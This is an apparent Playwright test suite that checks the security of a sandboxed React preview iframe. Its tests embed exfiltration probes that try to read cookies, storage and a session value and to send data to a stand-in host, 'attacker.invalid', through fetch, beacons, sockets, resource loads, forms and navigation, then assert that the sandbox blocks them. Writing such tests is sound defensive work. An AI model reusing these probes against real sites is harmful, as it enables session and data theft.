import { test, expect, type Page } from '@playwright/test'
import { compileSourceFiles } from '../src/make/compiler.ts'
import { PREVIEW_MESSAGE_CHANNEL, MAX_PREVIEW_MESSAGE_BYTES } from '../src/make/preview-sandbox.ts'

async function mount(page: Page, source: string, css = '') {
  const result = await compileSourceFiles({ 'src/App.tsx': source, 'src/style.css': css })
  expect(result.success, JSON.stringify(result.diagnostics)).toBe(true)
  await page.goto('/e2e/fixtures/preview.html')
  await page.waitForFunction(() => 'loadPreview' in window)
  await page.evaluate(html => {
    document.cookie = 'paper_session=private; SameSite=Strict; path=/'
    localStorage.setItem('session', 'private'); sessionStorage.setItem('draft', 'private')
    ;(window as any).__paperSession = 'private'
    ;(window as any).loadPreview(html)
  }, result.assets!.html)
  return page.frameLocator('iframe').frameLocator('iframe')
}

test('compiled React interaction, lifecycle, ping, theme, reset and responsive preview', async ({ page }) => {
  const errors: string[] = []
  page.on('pageerror', error => errors.push(error.message))
  const preview = await mount(page, `
    import { useState } from 'react'; import './style.css'
    export default function App() {
      const [count, setCount] = useState(0); const [text, setText] = useState('')
      return <main><h1>Paper Make</h1><button onClick={() => setCount(c => c + 1)}>Count: {count}</button>
        <input aria-label="Message" value={text} onChange={e => setText(e.target.value)} /><p>{text}</p></main>
    }`, `main { min-height:100vh; display:grid; align-content:center; gap:24px; padding:24px; background-image:linear-gradient(#222 1px,transparent 1px),linear-gradient(90deg,#222 1px,transparent 1px);background-size:120px 120px; } button { background:#81adec;color:#080808;padding:12px;border:0; }`)
  await expect(page).toHaveTitle('Paper Preview Security Fixture')
  await expect(page.locator('#status')).toHaveText('ready')
  await preview.getByRole('button', { name: 'Count: 0' }).click()
  await expect(preview.getByRole('button')).toHaveText('Count: 1')
  await preview.getByRole('textbox').fill('Hello Paper')
  await expect(preview.locator('p')).toHaveText('Hello Paper')
  expect(await page.evaluate(() => (window as any).preview.current.ping(1000))).toBeGreaterThanOrEqual(0)
  await page.evaluate(() => (window as any).preview.current.setTheme({ background: '#edebe1', foreground: '#080808' }))
  await expect(preview.locator('body')).toHaveCSS('background-color', 'rgb(237, 235, 225)')
  await page.screenshot({ path: '/tmp/paper-preview-desktop.png' })
  await page.setViewportSize({ width: 390, height: 844 })
  await expect(preview.getByRole('button')).toBeVisible()
  await page.screenshot({ path: '/tmp/paper-preview-mobile.png' })
  await page.evaluate(() => (window as any).preview.current.reload())
  await expect(preview.getByRole('button')).toHaveText('Count: 0')
  expect(errors).toEqual([])
})

test('opaque preview denies parent and top DOM, cookies, storage and session access', async ({ page }) => {
  const preview = await mount(page, `
    import { useState, useEffect } from 'react'
    export default function App() {
      const [report, setReport] = useState({})
      useEffect(() => { const result = {}; const probes = {
        parentDOM: () => parent.document, topDOM: () => top.document,
        parentCookie: () => parent.document.cookie, cookie: () => document.cookie,
        parentStorage: () => parent.localStorage, local: () => localStorage,
        session: () => sessionStorage, topSession: () => top.sessionStorage,
        secret: () => top.__paperSession
      }; for (const [name, probe] of Object.entries(probes)) {
        try { probe(); result[name] = 'LEAKED' } catch (e) { result[name] = e.name }
      } setReport(result) }, [])
      return <pre>{JSON.stringify(report)}</pre>
    }`)
  await page.evaluate(() => {
    document.cookie = 'paper_session=private; SameSite=Strict; path=/'
    localStorage.setItem('session', 'private'); sessionStorage.setItem('draft', 'private')
    ;(window as any).__paperSession = 'private'
  })
  const report = JSON.parse(await preview.locator('pre').innerText())
  expect(Object.keys(report)).toHaveLength(9)
  expect(Object.values(report)).toEqual(Array(9).fill('SecurityError'))
  expect(await page.evaluate(() => [document.cookie, localStorage.getItem('session'), sessionStorage.getItem('draft'), (window as any).__paperSession])).toEqual(['paper_session=private', 'private', 'private', 'private'])
})

test('CSP blocks exfiltration requests, scripts, styles, frames, workers, forms and popups', async ({ page, context }) => {
  const requests: string[] = [], sockets: string[] = [], popups: unknown[] = []
  await context.route('**/leak/**', route => { requests.push(route.request().url()); return route.abort() })
  page.on('websocket', socket => {
    if (!socket.url().startsWith('ws://127.0.0.1:4173/')) {
      sockets.push(socket.url())
    }
  })
  page.on('popup', popup => popups.push(popup))
  const preview = await mount(page, `
    import { useEffect, useState } from 'react'; import './style.css'
    export default function App() {
      const [probes, setProbes] = useState('pending');
      useEffect(() => {
        let attempted = 0; const probe = fn => { attempted++; try { fn() } catch {} };
        const url = 'https://attacker.invalid/leak/'; const style = document.createElement('style'); style.textContent = '@import url(https://attacker.invalid/leak/css)'; document.head.append(style);
        probe(() => fetch(url + 'fetch', { credentials: 'include' }).catch(() => {}));
        probe(() => { const xhr = new XMLHttpRequest(); xhr.open('GET', url + 'xhr'); xhr.onerror = () => {}; xhr.send() });
        probe(() => navigator.sendBeacon(url + 'beacon', 'private'));
        probe(() => { const ws = new WebSocket('wss://attacker.invalid/leak/ws'); ws.onerror = () => {} });
        probe(() => { const es = new EventSource(url + 'events'); es.onerror = () => es.close() });
        for (const [tag, attr] of [['img','src'], ['script','src'], ['iframe','src'], ['video','src'], ['object','data'], ['link','href']]) {
          const el = document.createElement(tag); if (tag === 'link') el.rel = 'stylesheet'; el[attr] = url + tag; probe(() => document.body.append(el));
        }
        probe(() => new Worker(url + 'worker')); setProbes(String(attempted));
      }, [])
      return <main><h1>Attack probes complete</h1><p id="probes">{probes}</p><a target="_top" href="https://attacker.invalid/leak/top">Navigate top</a>
        <button onClick={() => { try { top.location.href = 'https://attacker.invalid/leak/top-script' } catch {} window.open('https://attacker.invalid/leak/popup') }}>Attack</button>
        <form action="https://attacker.invalid/leak/form"><button>Submit</button></form></main>
    }`, `body { background-image:url('https://attacker.invalid/leak/background'); }`)
  await expect(preview.getByRole('heading')).toHaveText('Attack probes complete')
  await expect(preview.locator('#probes')).toHaveText('12')
  await preview.getByRole('link').click()
  await preview.getByRole('button', { name: 'Attack', exact: true }).click()
  await preview.getByRole('button', { name: 'Submit' }).click()
  await expect(page).toHaveURL(/preview.html$/)
  // Wait for asynchronous CSP events, rather than treating WebSocket construction as success.
  await page.waitForTimeout(250)
  expect(requests).toEqual([]); expect(sockets).toEqual([]); expect(popups).toEqual([])
})

for (const vector of ['location', 'link', 'refresh']) {
  test(`trusted outer frame blocks network exfiltration through guest self-navigation: ${vector}`, async ({ page, context }) => {
    const requests: string[] = []
    await context.route('**/leak/**', route => { requests.push(route.request().url()); return route.abort() })
    const preview = await mount(page, `export default function App() { return <button onClick={() => {
      const url = 'https://attacker.invalid/leak/self';
      if ('${vector}' === 'location') location.href = url;
      if ('${vector}' === 'link') { const a = document.createElement('a'); a.href = url; a.click() }
      if ('${vector}' === 'refresh') { const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=' + url; document.head.append(m) }
    }}>Navigate self</button> }`)
    await preview.getByRole('button').click()
    await page.waitForTimeout(250)
    expect(requests).toEqual([])
    await expect(page).toHaveURL(/preview.html$/)
  })
}

test('host ignores sibling, direct guest, malformed and oversized messages; bounds valid traffic', async ({ page }) => {
  const preview = await mount(page, `export default function App() { return <h1>Protocol fixture</h1> }`)
  await expect(page.locator('#status')).toHaveText('ready')
  const envelope = { channel: PREVIEW_MESSAGE_CHANNEL, version: 1, source: 'paper-preview', type: 'preview:event', id: 'event', timestamp: 1, payload: { name: 'accepted' } }
  await page.evaluate(msg => { window.postMessage(msg, '*'); const f = document.createElement('iframe'); document.body.append(f); f.contentWindow!.eval('parent.postMessage(' + JSON.stringify(msg) + ', "*")'); f.remove() }, envelope)
  // Direct messages to top must bypass neither the relay nor the source check.
  const guest = await preview.locator('h1').elementHandle()
  await guest!.evaluate((_, msg) => {
    top!.postMessage(msg, '*')
    parent.postMessage({ ...msg, payload: null }, '*')
    parent.postMessage({ ...msg, payload: { name: 'large', data: 'x'.repeat(70000) } }, '*')
    parent.postMessage({ ...msg, type: 'preview:error', payload: {} }, '*')
    parent.postMessage(msg, '*')
  }, envelope)
  await expect.poll(() => page.evaluate(() => (window as any).previewEvents.length)).toBe(1)
  expect(await page.evaluate(() => (window as any).previewEvents)).toEqual([{ name: 'accepted' }])
  await expect(page.locator('#status')).toHaveText('ready')
  // Exercise the guest receiver's source and size validation with real postMessage events.
  expect(MAX_PREVIEW_MESSAGE_BYTES).toBe(65536)
  await page.evaluate(() => (window as any).preview.current.postMessage('preview:set-theme', { background: '#81adec' }))
  await expect(preview.locator('body')).toHaveCSS('background-color', 'rgb(129, 173, 236)')
})

test('runtime errors surface and a new revision recovers without stale lifecycle state', async ({ page }) => {
  await mount(page, `throw new Error('Preview crashed'); export default () => <div />`)
  await expect(page.locator('#status')).toHaveText('error')
  await expect(page.getByRole('alert')).toContainText('Preview crashed')
  const next = await compileSourceFiles({ 'src/App.tsx': 'export default () => <h1>Recovered revision</h1>' })
  await page.evaluate(html => (window as any).loadPreview(html), next.assets!.html)
  await expect(page.locator('#status')).toHaveText('ready')
  await expect(page.frameLocator('iframe').frameLocator('iframe').getByRole('heading')).toHaveText('Recovered revision')
  await expect(page.getByRole('alert')).toHaveCount(0)
})
